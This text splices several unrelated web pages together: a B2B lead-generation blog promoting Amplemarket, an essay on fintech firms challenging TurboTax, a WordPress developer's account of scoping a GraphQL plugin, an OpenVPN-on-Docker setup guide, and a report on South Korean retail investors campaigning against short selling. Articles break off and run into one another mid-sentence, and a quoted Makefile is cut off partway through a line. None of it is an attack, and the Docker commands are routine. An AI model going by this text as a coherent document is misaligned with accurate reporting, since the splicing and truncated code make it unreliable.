<p>Once you have your accounts list, you shouldn’t randomly target decision-makers within those companies. On lead filters, narrow to decision-makers that recently changed jobs. </p>

<p>Why? These people just entered a new role, on a growing team. This means, they are looking to shake things up internally and have available money to spend right now.</p>

<p><a href="http://blog.amplemarket.com/how-to-find-purchase-intent-linkedin/?utm_source=blog_lead_gen&amp;utm_medium=referral&amp;utm_campaign=blog_lead_gen">In this article about how to find purchase intent on Sales Navigator</a>, we explain this approach step-by-step. </p>

<p><img src="https://i.imgur.com/xVPbzTX.jpg" alt="[b2b lead generation]" title=""></p>

<h2 id="3generateleadsfromconferenceattendees">3. Generate leads from conference attendees</h2>

<p>Industry-relevant events are a great way to connect with potential customers in your niche. Even with conferences going remote in 2020 (and expectably in 2021 too), this is a great opportunity to reach out to these people.</p>

<p>Using a lead generation tool like Amplemarket, you can easily filter for companies that are attending industry-relevant events. <a href="https://amplemarket.com/demo?utm_source=blog_lead_gen&amp;utm_medium=referral&amp;utm_campaign=blog_lead_gen">Check here</a> how this could work for you.</p>

<p><img src="https://i.imgur.com/dBPC59D.png" alt="[b2b lead generation]" title=""></p>

<p>You see? With a quick search, you can easily find hundreds or thousands of good leads to reach out to.</p>

<p>Alternatively, you can also purchase the tickets for each conference and have access to the attendees' page.</p>

<p>Still not convinced?</p>

<p>Some other great companies have tested this strategy with success. You can see what a <a href="http://goodsalesemails.com/campaigns/pandadoc-1?utm_source=blog_lead_gen&amp;utm_medium=referral&amp;utm_campaign=blog_lead_gen">real outreach example from PandaDoc looks like here</a>.</p>

<h2 id="4generateleadsfromconferencenonattendees">4. Generate leads from conference <em>non-attendees</em></h2>

<p>Many times, the decision-makers within your Ideal Customer Profile (ICP) are not the ones attending the conferences. This strategy enables you to re-target companies that attended industry-relevant events with the "wrong" people. </p>

<p>Great! How?</p>

<p>You've got the companies from strategy #3. You just need to re-target your approach to decision-makers that better fit your ICP but didn't attend the conference and that's it!</p>

<p>In the end, you'll either have leads with more seniority or leads that belong to a different team.</p>

<p>Note: You can also add the companies that didn't convert in strategy #3.</p>



<p>Every day, you can find new lists online that feature / bundle companies in several topics. Depending on your industry, you might be interested in companies like: New Unicorn Companies in 2020 or Fortune 1000.</p>

<p>There are several ways you can find the relevant contacts for these companies. For instance, you may use advanced google searches or you may know some online resources. </p>

<p>Any tactic you choose, you can use these lists to leverage <em>relevancy</em> in a dedicated message.</p>

<p>💡 <strong>Hint:</strong> You can add an extra point to relevancy and personalization if you know which technologies these companies use and you integrate with. </p>

<p>Note: Find this information on websites like Crunchbase, reviews pages like G2, Capterra, and Featured Customers, or on the tool's website under the customer testimonials section</p>

<p><strong>Example:</strong></p>

<blockquote>
  <p><em>"I found you on the 2020 Unicorns list"</em> - this alone might not be enough</p>
</blockquote>

<p><strong>Adding more value:</strong></p>

<blockquote>
  <p><em>"Congrats, I just saw your company made into the Unicorns list in 2020. I’m reaching out because I see that you use {{tool}} which we integrate... "</em> - <strong>this type of message will make you stand out from the crowd</strong>.</p>
</blockquote>

<p>On <a href="https://amplemarket.com/demo">Amplemarket</a>, we do this for you:</p>

<p><img src="https://i.imgur.com/RizWaNy.png" alt="[b2b lead generation]" title=""></p>

<h2 id="6generateleadsfromyourparticipationinrelevantslacklinkedinandfacebookgroups">6. Generate leads from your participation in relevant Slack, LinkedIn, and Facebook groups</h2>

<p>Slack, LinkedIn and Facebook groups are a great and unexplored way of generating leads. While people ask questions about how to solve their issues, you can find unexplored opportunities by helping them out with your solution.</p>

<p>Whether your industry prefers Slack, LinkedIn or Facebook groups to hang out and debate relevant topics doesn’t really matter for the purpose of your lead generation efforts.</p>

<p>Example: For companies in the marketing technology industry, this Slack group has a channel where people share their issues with experts in the field. If your product solves the issue, you can easily jump into the conversation and potentially win a new customer. </p>

<p><img src="https://i.imgur.com/UZrvp8n.png" alt="[b2b lead generation]" title=""></p>

<p>This strategy may not be the top source of leads in terms of volume, but with the right process, you can easily approach prospects that are just looking to solve the issue you solve for.</p>

<p>Manually checking for each message on the channel isn’t very efficient. With <a href="https://zapier.com/">zapier.com</a>, create customized notifications on your slack whenever someone mentions a relevant topic to you.</p>

<h2 id="7generateleadswhencompaniesareapprovingnewbudgets">7. Generate leads when companies are approving new budgets</h2>

<p>For most B2B SaaS companies the last 2 months of the year is a period when a lot of companies approve budgets, renew contracts, or evaluate new vendors for the upcoming new year. From a timing perspective, this is one of the best moments to jump into a conversation and eventually win some customers. </p>

<p>At this time of the year, you can easily search for companies using your competitor tools and create a dedicated message on Amplemarket. </p>

<p>Just as an example, a message like this will trigger their curiosity to learn more about your tool:</p>

<blockquote>
  <p><em>"I noticed you’re using {{competitor_tool}}, I reached out because for a lot of companies the end of the year is usually a period when they evaluate renewals with vendors. Is that the case for {{competitor_tool}}? If so, I would love to connect, we at XYZ..."</em></p>

        <p>February 2021</p>
        <p>
          <a href="https://twitter.com/jessewilson">Jesse Wilson</a> once said to me:
          </p>
          <p>

“What if we could give customers a button. They’d press it at the end of the year and it would automagically file their taxes for them.”
</p>
<p>
At the time I thought the idea was appealing, but didn’t think much more about it. Today, I think this is the way TurboTax gets dismantled. It’s taking consumer finance companies with massive distribution, combining them with a tax preparation API and real-time visibility into users tax position. Tackling TurboTax head on is probably a waste of money. Tackling TurboTax asymmetrically has a real shot.
</p>

<h2>TurboTax is functionally a monopoly</h2>
<p>
From the outside looking in, TurboTax has a near impregnable moat. In taxes, there’s no clear second player with near the level of distribution, automation, community, trustworthiness, brand recognition and regulatory capture that they have. They’re incredible at playing regulatory defense by constantly and subtly opposing any government efforts to simplify taxes[1], which simultaneously makes their product more valuable and raises the bar for new entrants. Even the Justice Department recognizes TurboTax as a functional monopoly, and forced Intuit to sell CreditKarma Tax in order to complete the acquisition.[2]

They’re also strong at sniping competition early, before it becomes a serious threat. <a href="http://allthingsd.com/20130808/a-techstars-first-startup-goodapril-gets-acquired-before-demo-day/">GoodApril</a> is an example; the company went through TechStars in 2013 and was focused on tax planning, initially for gig economy workers. Intuit acquired them before demo day, pre-empting their Series A.[3] 
</p>
<p>

More recently, from the outside looking in, you’d think they missed CreditKarma Tax by acquiring Credit Karma and selling the tax business to Cash App. I think more likely, CK gained scale before threatening Intuit by launching the tax product. The acquisition was at least valuable for a) securing CK’s distribution for TurboTax’s use and b) reducing the likelihood that a good competitor would emerge. You might bet that Cash App successfully executes on the transaction, but it’s at least not a guarantee, from Intuit’s perspective. 
</p><p>

TurboTax also owns the namespace for consumer taxes. Every year between January and April they become the top finance app and a top 10 app in the US Appstore. It’s possible someone builds a better direct to consumer product focused on tax prep, but I’m skeptical.
        </p>

          </p>
        <p>
            All things considered, I think TurboTax is a fantastic business, and will be tough to compete with head on. It’s more likely that the following pieces come together to obviate TurboTax.
</p>
          <p>

Consumer finance distribution + tax prep API + differentiated tax planning (eg real-time tax computation)


        </p>
        <h2>The challenge</h2>
        
        <p>
Unseating TurboTax has been hard historically for a few reasons.
</p>

<h3>Superb distribution</h3>
<p>
As a startup, you have a 3.5 month window every year to acquire tax customers. During tax season, TurboTax already dominates the organic acquisition, Appstore rankings and paid acquisition channels. They’ve been doing it for years, they’re probably quite efficient, and you’re not going to outspend (or smartly out acquire) Turbotax from New Years day to tax day. [4]
</p>
      <div>
        
        <p><img src="https://kunle.app/images/appstore.jpeg">
        </p>
        
      </div>
            
          

<h3>Perception &amp; Quality</h3>
<p>
Doing taxes well for mainstream consumers is complicated, and the consequences of getting them wrong are both bewildering and material. Every year the tax code gets more complex. This benefits the player who already has internally encoded the complexity, and for whom additional complexity is incremental rather than absolute (starting from 0). Simply put, you have one shot to build customer trust, and if you get it wrong you really screw up the customer’s life. Why would any consumer take that risk? 
</p>
<p>

TurboTax has been doing your taxes for years, already has your previous filings, and will use them to prefill tons of fields for you. All the while, you’ve probably never been audited. It just works.
</p>

<h2>It’s time to build (tax prep software)</h2>
<p>
To defeat TurboTax, a lot of the ingredients exist already. They’re just in the process of being assembled.
</p>

<h3>Consumer Finance Distribution</h3>
<p>
To defeat Turbotax, you need consumer distribution that’s as good or better than what TurboTax has. Without this, they’ll outspend you on customer acquisition every tax season, long before you can make a dent. It helps to already have established consumer trust with an adjacent offering, because if the only benefit of your product is tax preparation, you’ll be forced to acquire customers during tax season and compete head on, and you’ll be outspent.
</p>
<p>
Today, multiple consumer finance products already have the distribution necessary to compete. These include products like Cash App, Chime, Venmo, Robinhood and others, which have wide ranging customer trust and customer bases in the tens of millions each. Crucially, these products acquire customers upstream of tax season - they provide financial services to consumers all year around. They also already have a partial picture into a customer’s financial life, and they’re already thinking about customers’ tax needs. Cash App has taken a first party approach (by buying Credit Karma Tax).
</p>
<div>
        
        <p><img src="https://kunle.app/images/robinhood.jpeg">
</p>
        
      </div>

<p>
 
Robinhood has taken a lead gen approach (by partnering with TurboTax). No one’s built on a tax API (because none currently exist). [5] For TurboTax this will be death by a thousand cuts - it will be years before a single player files more taxes than TurboTax. But the top 5 neobanks can drain enough volume to have a material impact.
</p>

<h3>Differentiated Tax Planning: Real time tax position</h3>
<p>
Turbotax is insanely focused on consumer tax needs during filing season. To date, this has been sufficient to win. Over the last 18 months, however, “new” things are possible around taxes that weren’t before. Today, high quality income and tax withholding data is available via API. With this data, you can compute your tax position in real time at any point in the year, which has two core financial benefits; a) you can know your tax liability at any point in the year with reasonable precision, and b) with that knowledge, you can optimize it. For instance, you could build a continuous W2 with Pinwheel’s <a href="https://docs.getpinwheel.com/docs/api/reference/pinwheel-api.v1.json/paths/~1accounts~1%7Baccount_id%7D~1paystubs/get">paystubs endpoint.</a>
</p>
<p>
This financial benefit wasn’t possible before the last couple of years, and it’s outside of TurboTax’s wheelhouse, because TurboTax optimizes and monetizes the tax transaction at year end, and essentially re-acquires taxpayers each season. Outside of tax season, I basically don’t log into TurboTax.
</p>
<p>
Over the last couple of years, several companies have emerged that provide programmatic, API based access to high quality income and wage data for consumers, including <a href="https://www.getpinwheel.com/">Pinwheel</a> (where I’m invested), <a href="https://argyle.com/">Argyle</a>, and <a href="https://atomic.financial/">Atomic</a>. I suspect <a href="https://plaid.com/docs/deposit-switch/">Plaid's deposit switch</a> team will eventually offer this as well.


Any consumer finance company can now provide a few foundational benefits to customers: 
</p><ul>
<li>Building the customer’s tax forms (eg W2 or 1099) continuously throughout the year using their payroll data</li>
<li>Providing the user a rolling, real-time view of their tax position (taxes owed, refunds) as they earn and spend throughout the year</li>
<li>Trust from the customer that you’re the right company to help file their taxes at year end. At year end - customers press a button, answer some qualifying questions, and electronically file the taxes</li>
</ul>

<p>
On top of these foundational benefits, there’s even more financial benefits that can be built. These are less straightforward, but no less valuable:
</p><ul>
<li><span>Tax refund factoring;</span> providing consumers access to refunds prior to tax season. There’s a bunch of regulatory complexity here and some fraud to account for, including users omitting crucial info to overstate their refunds. </li>
<li><span>Tax optimization;</span> recommending changes to income and spend behavior to improve year end tax liability positioning. This already happens a lot at the high end through concepts like tax loss harvesting and smb expense write offs; it’s just rarer for regular W2 and 1099 earners. In today’s world, by the time you’re logging into TurboTax, you’ve missed any shot at optimizing your tax position. Optimizations include amounts to save in tax advantaged accounts like HSA’s and 401Ks, tax allowances you’re eligible for, etc.</li>
<li><span>Spend categorization for tax purposes;</span> paired with an issued card, you can help categorize transactions and suggest which to save receipts for at year end. Mint and other PFMs focus on transaction categorization for budgeting; no one’s really focused on it for personal taxes. [6]</li>
<li><span>Advance capital gains optimisation;</span> tax loss harvesting tools exist, but with where rates are now there are interesting package strategies to allow customers finance instead of selling assets.[7] This starts with creating a live Schedule D and some scenario analysis tools which show customers their alternatives to getting cash today.</li>
</ul>


<p>
At its heart, this approach reaches the customer for a tax use case upstream of when TurboTax acquires them. This means a) you’re not competing at the time of year when TurboTax’s acquisition dollars will drown you, and b) you’re acquiring the customer mid-year, before taxes consume their attention. The best time to optimize your taxes are long before you have to pay them, and neobanks are well placed to provide this benefit.
</p>

<h2>What’s missing: tax preparation as an API</h2>
<p>
Today, there are lots of companies providing tax filing APIs, that would allow a tax preparer electronically file taxes that have already been prepared. From what I can see, no one’s building an API that manages the preparation of taxes. At a minimum you need a system that 
</p><ul>
<li>takes the various inputs (1099, W2 etc) and computes a tax position
asks a series of leading questions to learn more about the consumer (things like whether you’re married, head of household etc) to improve the tax …</li></ul></div></div>

His expression demonstrates that he believes there is only one GraphQL plugin, when in fact there are two (the one left out is, well, mine). That made me realize how little visibility my plugin has, and I felt bad about it.</p><p>Matt didn't know my plugin existed. Nor does most of the WordPress community, for that matter. Clearly I'm not publicizing it well enough. I know that I suck in marketing and social media; I'm just OK with technical stuff (or so I believe). So I decided to do something about it, at least within my capabilities.</p><p>So this is what I'm working on:</p><ul><li>I just finished coding this same website, <a href="https://graphql-api.com/">graphql-api.com</a>, and launched it 2 weeks ago (yay! 🥳 Btw, how do you like it? Be welcome to give me feedback, via <a href="https://twitter.com/losoviz/">DM</a> or <a href="mailto:leo@getpop.org">email</a>)</li><li>3 days ago, I finally started scoping the plugin, and finished this task yesterday! (At 3 am, but it was worth it 😅)</li><li>And finally, I'm already working on the upcoming version <code>0.8</code>, which will be the first one available in the plugin repository</li></ul><p>Scoping the plugin is mandatory to upload it to the repository, because otherwise it could conflict with a different plugin, which requires the same dependency as my plugin, but with a different version. Having done it is a really big milestone; no other development is as important. For instance, I must still complete the GraphQL schema to fully match the WordPress data model, but that will be done steadily on each new release.</p><p>So in a few weeks from now, the plugin will show up when searching for "GraphQL", and the people who are actually needing to implement a GraphQL API will get to know of my plugin's existence.</p><p>Indeed, I do want my plugin to be seriously considered for the future of WordPress. I've been working on it for several years now. <a href="https://github.com/leoloso/PoP">The repo</a> was started back in August 2016; that is even before WPGraphQL existed, and at the beginning of GraphQL. But I didn't know that the project would become a GraphQL server; it took that direction only around 1.5 years ago.</p><p>(The project is actually a framework to build applications using server-side components, and a GraphQL server could perfectly be built using this architecture. So then I just built it).</p><p>WPGraphQL is an established plugin, and rightly so: it was started a few years ago, and a community was built around it. The work by <a href="https://twitter.com/jasonbahl">Jason Bahl</a> (who is employed by Gatsby) and <a href="https://github.com/wp-graphql/wp-graphql/graphs/contributors">the contributors to his project</a> has been outstanding: integrating WordPress into the Jamstack is now easier than ever.</p><p>But one thing is Gatsby and the Jamstack, and another thing is WordPress. WordPress is 40% of the web, not just an input to a static site generator.</p><p>So now, we can consider if WPGraphQL is the right option, without having this decision taken for us out of lack of alternatives. We can now analyze both plugins to see whose goals are more aligned to what's important for WordPress.</p><p>The GraphQL API for WordPress can also work with the Jamstack. But its main objectives are, I believe, more splendid: To "democratize data publishing", so that editing an API becomes as easy as editing a post (something everyone can do), and to make WordPress become the OS of the web.</p><p>Once the plugin is available on the repository, I hope more people will try it out and say "Hey, this is so friking awesome! How comes I didn't know about this stuff before?".</p><p>And then, the choice of "the GraphQL plugin" is not pre-determined, and the WordPress community can consider both WPGraphQL and the GraphQL API for WordPress based on their own merits.</p><p>Now that my motivations are out of the way, let's talk technical stuff 🤓.</p><h2 id="heading-checking-out-the-options">Checking out the options<a href="#heading-checking-out-the-options"><span> permalink</span></a></h2><p>Scoping a plugin involves running some tooling, that takes the plugin code as input, and spits out the scoped plugin. No big deal, right? How hard can that be?</p><p><img src="https://graphql-api.com/images/dog-scope-plugin.jpg" alt="Talking technical" loading="lazy" width="505" height="494"></p><p>Well, depending on the codebase, just executing the scope command alone won't be enough. After that, we need to check for errors in the console, fix them, test the application thoroughly, identify errors and why they happen, fix them, and iterate. To get it completely right, it might require some time.</p><p>There are 2 libraries for scoping, which have different goals:</p><ul><li><a href="https://github.com/coenjacobs/mozart">Mozart</a>, for WordPress code</li><li><a href="https://github.com/humbug/php-scoper">PHP-Scoper</a>, for any PHP code, particularly when producing PHARs</li></ul><p>Because I have a WordPress plugin, I tried out Mozart first. Let's see how it fared.</p><h2 id="heading-trying-out-mozart-and-failing">Trying out Mozart, and failing<a href="#heading-trying-out-mozart-and-failing"><span> permalink</span></a></h2><p>I tried Mozart around 1 year ago. For what it says in the documentation, "the <code>mozart compose</code> command does all the magic". So I expected it all to be very quick and simple, and go enjoy a daiquiri for the rest of the day.</p><p>Alas, Mozart never worked for my codebase. It kept running into issues, so the scoping never materialized. And I couldn't get the required assistance: I submitted a PR, but <a href="https://github.com/coenjacobs/mozart/pull/36#issuecomment-633013728">it was not considered for merging</a>, and I was not even notified about it, so I kept waiting until I naturally lost interest in this project.</p><p>I believe that Mozart couldn't handle some of the dependencies in my plugin. I'm making use of several of Symfony's components, including <a href="https://symfony.com/doc/current/components/dependency_injection.html">DependencyInjection</a>, <a href="https://symfony.com/doc/current/components/cache.html">Cache</a> and <a href="https://github.com/symfony/dotenv">Dotenv</a>, with everything managed through Composer.</p><p>Scoping PHP is not just about PHP, so the scoper will have many hurdles to avoid and challenges to solve. For instance, Symfony DependencyInjection uses <code>YAML</code> files to set-up configuration, and these must be scoped too. And the <code>composer.json</code> file contains the configuration for <code>PSR-4</code> autoloading, and this must be scoped too. And, I believe, Mozart couldn't handle these complexities properly.</p><p>But I'm sure that my experience is not the only one, and that there are many happy users our there. Also, my failed attempt happened 1 year ago, so I wonder if the tool has been improved since then. And then, don't forget the saying: "All scoped plugins are alike; each unscoped plugin is unscoped in its own way", so possibly it fails just for me.</p><p>If your WordPress plugin is simple, with self-contained logic, and scoping must be performed within PHP code only, then chances are that Mozart will work. You just gotta find out.</p><h2 id="heading-checking-php-scoper-and-coming-out-in-panic">Checking PHP-Scoper, and coming out in panic<a href="#heading-checking-php-scoper-and-coming-out-in-panic"><span> permalink</span></a></h2><p>So I headed for PHP-Scoper. However, I never even tried to try it, because I got frightened immediately by it.</p><p>To start with, <a href="https://github.com/humbug/php-scoper#wordpress">this tool does not naturally support WordPress</a>. And to continue, they recommend to take a look at <a href="https://github.com/humbug/php-scoper/blob/master/Makefile">their own Makefile</a>, which looks like this:</p><pre><code><span></span><br><span>MAKEFLAGS <span>+=</span> --warn-undefined-variables</span><br><span>MAKEFLAGS <span>+=</span> --no-builtin-rules</span><br><span></span><br><span>.DEFAULT_GOAL :<span>=</span> <span>help</span></span><br><span></span><br><span><span>PHPBIN</span><span>=</span>php</span><br><span><span>PHPNOGC</span><span>=</span>php -d zend.enable_gc<span>=</span><span>0</span></span><br><span><span>IS_PHP8</span><span>=</span><span><span>$(</span>shell php -r <span>"echo version_compare(PHP_VERSION, '8.0.0', '&gt;=') ?

It looks like a riddle. Believing that I needed to understand that code just to scope my plugin, made me flee unceremoniously.</p><p>(Well, understanding that code is their recommendation to test the scoped application, but it is not required.

I knew that WordPress could be scoped with it from reading <a href="https://deliciousbrains.com/php-scoper-namespace-composer-depencies/">PHP Scoper: How to Avoid Namespace Issues in your Composer Dependencies</a> (by the brilliant folks from Delicious Brains). It was just a matter of attitude, and perseverence.</p><p>I explored some of the existing solutions, including:</p><ul><li><a href="https://github.com/humbug/php-scoper/issues/442#issuecomment-736598602">This one</a> by Lucas Bustamante</li><li><a href="https://github.com/Yoast/wordpress-seo/blob/11.3/src/config/dependency-management.php">This one</a> by Yoast</li><li><a href="https://github.com/google/site-kit-wp/blob/80e3bd88317bf20bc5e5d6600428692fa8e3fc08/includes/loader.php">This one</a> by Google Site Kit</li><li><a href="https://github.com/google/web-stories-wp/blob/main/scoper.inc.php">This one</a> by Google Web Stories</li></ul><p>But they all look not fully satisfying to me: either the code seems hacky, or fragile and waiting to break at some time or another.</p><p>For instance, the Google Web Stories plugin scopes the code, and then reverts back each one of the conflicts:</p><pre><code><span><span>return</span> <span>[</span></span><br><span>  <span>'patchers'</span>                   <span>=&gt;</span> <span>[</span></span><br><span>		<span>function</span> <span>(</span> <span>$file_path</span><span>,</span> <span>$prefix</span><span>,</span> <span>$contents</span> <span>)</span> <span>{</span></span><br>			<br><span>			<span>$contents</span> <span>=</span> <span>str_replace</span><span>(</span> <span>"\\$prefix\\_doing_it_wrong"</span><span>,</span> <span>'\\_doing_it_wrong'</span><span>,</span> <span>$contents</span> <span>)</span><span>;</span></span><br><span>			<span>$contents</span> <span>=</span> <span>str_replace</span><span>(</span> <span>"\\$prefix\\__"</span><span>,</span> <span>'\\__'</span><span>,</span> <span>$contents</span> <span>)</span><span>;</span></span><br><span>			<span>$contents</span> <span>=</span> <span>str_replace</span><span>(</span> <span>"\\$prefix\\esc_html_e"</span><span>,</span> <span>'\\esc_html_e'</span><span>,</span> <span>$contents</span> <span>)</span><span>;</span></span><br><span>			<span>$contents</span> <span>=</span> <span>str_replace</span><span>(</span> <span>"\\$prefix\\esc_html"</span><span>,</span> <span>'\\esc_html'</span><span>,</span> <span>$contents</span> <span>)</span><span>;</span></span><br><span>			<span>$contents</span> <span>=</span> <span>str_replace</span><span>(</span> <span>"\\$prefix\\esc_attr"</span><span>,</span> <span>'\\esc_attr'</span><span>,</span> <span>$contents</span> <span>)</span><span>;</span></span><br><span>			<span>$contents</span> <span>=</span> <span>str_replace</span><span>(</span> <span>"\\$prefix\\esc_url"</span><span>,</span> <span>'\\esc_url'</span><span>,</span> <span>$contents</span> <span>)</span><span>;</span></span><br><span>      <span>$contents</span> <span>=</span> <span>str_replace</span><span>(</span> <span>"\\$prefix\\do_action"</span><span>,</span> <span>'\\do_action'</span><span>,</span> <span>$contents</span> <span>)</span><span>;</span></span><br><span>      </span><br><span>    <span>}</span></span><br><span>  <span>]</span></span><br><span><span>]</span></span></code></pre><p>I understand why they do it, but I don't like it.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In this short guide I will show you how to quickly install an OpenVPN
 server using an existing Docker image. It is possible to install an 
OpenVPN server, but with Docker everything is much easier. You don't 
need to buy a third party service, everything is completely free.</p><p>You
 must have your own VPS server. If not, you can buy a VPS on 
DigitalOcean. You can buy the least expensive from
 $2 to $5 per month.</p><p>I will use an off-the-shelf VPN solution built on Docker: <a href="https://github.com/kylemanna/docker-openvpn" target="_blank">https://github.com/kylemanna/docker-openvpn</a><br></p><p><br>All you need for the first step is to install Docker. I use Ubuntu OS.<br>If Docker is installed, let's move on to the next step.</p><p>I will use the following variables: <br></p><p><b>ovpn-data-example-uk</b> - It is for data volume container.</p><p><b>vpn.yourdomain.com</b> - The value should be a domain name or IP Address.</p><p><b>uk.vpn.yourdomain.com</b> - It’ll be used as a client definition.<br></p><p><i>These variables are test variables. You must use your variables.</i><br></p>

<p>Let’s begin by creating docker volume.</p>
<pre>docker volume create --name ovpn-data-example-uk</pre>

<p>The next step is to initialize the container.</p>

<pre>docker run \
    -v ovpn-data-example-uk:/etc/openvpn \
    --log-driver=none \
    --rm \
    kylemanna/openvpn \
    ovpn_genconfig \
        -u udp://vpn.yourdomain.com</pre><p>The container will ask you for a passphrase to protect the private key used by the newly generated certificate authority.</p>

<pre>docker run \
    -v ovpn-data-example-uk:/etc/openvpn \
    --log-driver=none \
    --rm \
    -it \
    kylemanna/openvpn \
    ovpn_initpki</pre><p>After the previous process finished, we can start the OpenVPN server process.<br>
</p><pre>docker run \
    -v ovpn-data-example-uk:/etc/openvpn \
    -d \
    -p 1194:1194/udp \
    --cap-add=NET_ADMIN \
    kylemanna/openvpn</pre><p>We can generate a client certificate without a passphrase to be used on our local machine.<br></p>


<pre>docker run \
    -v ovpn-data-example-uk:/etc/openvpn \
    --log-driver=none \
    --rm \
    -it \
    kylemanna/openvpn \
    easyrsa build-client-full uk.vpn.yourdomain.com nopass</pre><p>After the certificate created, we can retrieve the client configuration with embedded certificates file.<br>

</p><pre>docker run \

    --rm \
    kylemanna/openvpn \
    ovpn_getclient uk.vpn.yourdomain.com &gt; uk.vpn.yourdomain.com.ovpn</pre><p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>The Korean Stockholders’ Alliance is located in Yeouido, Seoul’s financial and political district, on the fifth floor of an officetel building mostly occupied by financial companies. Jung Eui-jung, the 62-year-old head of the Alliance and the sole resident of its office, points out the window to a large, bright-yellow bus parked outside on Eunhaengro (“bank street”), so named because it is home to South Korea’s two main state banks. The Alliance is an advocacy group that represents retail investors, with around 41,000 members. Its current mission statement is displayed in block letters on the side of the bus: “I hate short selling!”</p>



<p>Jung unveiled the bus at the end of January, not long after retail investors in the U.S. gathered on the Reddit forum r/WallStreetBets to drive up the share price of the video game retailer GameStop by 1,700% in a meme-fueled challenge to hedge funds who had shorted — in other words, bet against — the company’s stock. Helmed by a single driver, the Stockholders’ Alliance bus shuttles between Gwanghwamun, a public plaza often used for protests, and Yeouido, passing the stock exchange, financial regulators, and the National Assembly, in the hopes of igniting a similar movement in Korea.</p>



<p>Retail traders like Jung say that short selling is an exclusionary method of profiteering used by hedge funds to drive down stock prices and run roughshod over the little guys. That’s why the “David vs. Goliath” narrative surrounding GameStop has been so enthusiastically received by small investors in South Korea, who are known locally as “ants” — a nickname that captures their underdog identity.&nbsp;</p>



<p>“Not a lot of people really knew what short selling was,” said Jung, who founded the Alliance in 2019. “But the GameStop incident provided the spark of curiosity and awakened the public to the problem.”</p>



<p>As the story made local headlines, it stirred talk of a Korean copycat movement online. On Naver Cafe, the South Korean equivalent of Reddit, Jung later named the Alliance’s anti-short-selling campaign “kstreetbets.” The forum is where most of the group’s organizing — planning protests, petitioning regulators, and writing letters to lawmakers — is done.&nbsp;</p>



<p>As South Korea undergoes a <a href="http://www.hani.co.kr/arti/economy/economy_general/979164.html">retail trading boom</a> during the pandemic that has sent the country’s benchmark KOSPI index to record highs, this sort of activism has turned ants into a symbol of “<a href="http://www.hani.co.kr/arti/economy/finance/982101.html">economic democratization</a>” and an unlikely political force.&nbsp;</p>



<p>Pressure from retail traders like Jung pushed the government to extend a temporary ban on short selling, which was initially imposed in March of 2020. Now, with the current ban set to expire in May, Jung is campaigning for an additional <a href="https://www.chosun.com/economy/2021/02/02/L67EV46KXBGGDEWOIAGAPSI2EU/">year-long extension</a>, if not an outright abolition of the practice.&nbsp;</p>



<p>South Koreans have historically tended to steer clear of stocks, preferring to <a href="https://biz.chosun.com/site/data/html_dir/2020/04/03/2020040302464.html%2523:~:text=%2525EC%25259A%2525B0%2525EB%2525A6%2525AC%2525EB%252582%252598%2525EB%25259D%2525BC%2525EC%252597%252590%2525EC%252584%25259C%252520%2525EA%2525B0%252580%2525EA%2525B5%2525AC%2525EB%25258B%2525B9%252520%2525EB%2525B6%252580%2525EB%25258F%252599%2525EC%252582%2525B0%252520%2525EC%25259E%252590%2525EC%252582%2525B0,%2525EC%25258B%2525AC%2525EB%2525A6%2525AC%2525EB%25258F%252584%252520%2525EB%252582%252598%2525EB%2525B9%2525A0%2525EC%2525A7%252580%2525EA%2525B3%2525A0%252520%2525EC%25259E%252588%2525EB%25258B%2525A4.">invest in real estate</a>. Recently, however, government curbs on property investments, stagnant wages, low interest rates, and high property prices have left people searching for a quicker buck. Jung estimated that the number of active ants has increased from <a href="https://biz.chosun.com/site/data/html_dir/2021/01/07/2021010702594.html">6 million to 10 million</a> over the past year alone.</p>



<p>Much of that increase has been among <a href="https://investpension.miraeasset.com/contents/view.do?idx=12857">millennials</a> — known as the “2030 generation” — who are <a href="http://economy.chosun.com/client/news/view.php?boardName=C03&amp;page=3&amp;t_num=13609701">approaching stocks</a> with a generational pessimism, embodied in <a href="https://imnews.imbc.com/news/2021/society/article/6076397_34873.html">terms like <em>yeoung-ggeul</em></a><em> </em>(a Korean portmanteau that translates to “scraping together your soul to invest”) and <em>bittu</em> (taking out debt to invest). <a href="https://biz.chosun.com/site/data/html_dir/2021/01/12/2021011202205.html">Shunning conventional long-term investment vehicles</a> like index trackers or exchange-traded funds, they <a href="https://biz.chosun.com/site/data/html_dir/2021/01/07/2021010702594.html%2523:~:text=%2525EA%2525B1%2525B0%2525EB%25259E%252598%2525EB%2525B9%252584%2525EC%2525A4%252591%2525EC%25259D%252580%25252065.8%252525%2525EB%2525A1%25259C,%2525EB%2525B0%2525A9%2525EC%25258B%25259D%2525EC%25259C%2525BC%2525EB%2525A1%25259C%252520%2525EC%2525B0%2525B8%2525EC%252597%2525AC%2525ED%252595%252598%2525EA%2525B3%2525A0%252520%2525EC%25259E%252588%2525EB%25258B%2525A4.">have</a> preferred to <a href="https://biz.chosun.com/site/data/html_dir/2021/01/12/2021011202205.html">buy and sell their stocks directly</a>, seeking mid-to-high returns.

<p>Technology has also lowered the barrier to entry since Jung began investing in stocks as a salaryman bank worker in the mid-1990s. The new wave of retail investors tends to gravitate toward easy-to-use <a href="https://www.bloomberg.com/news/articles/2021-02-02/a-retail-trading-army-has-been-roiling-korean-stocks-for-months">brokerage apps</a> with low commissions and to finding trading strategies and tips online. “Back in the day, you’d study by reading books about stocks, but now the overwhelming trend is watching YouTube videos, especially for the 2030 generation,” Jung said.&nbsp;</p>



<p>That has brought its own perils. YouTube can be a valuable resource for the wise, but a minefield of fraudulent advice for the gullible. In legally ambiguous KakaoTalk or Telegram group chats known as “<a href="http://h21.hani.co.kr/arti/economy/economy_general/48901.html">leading rooms</a>,” anonymous stock tipsters (“leaders”) sweet-talk credulous ants with promises of windfall profits before bilking them. Some leaders <a href="https://www.mk.co.kr/news/stock/view/2021/01/39881/">turn out to be running pump-and-dump schemes</a>. Or “they’ll pull tricks like pretending to be offering a free service before directing you to a room with a subscription fee,” said Jung, who noted that he has reported some of the chat rooms to financial regulators.&nbsp;&nbsp;&nbsp;</p>



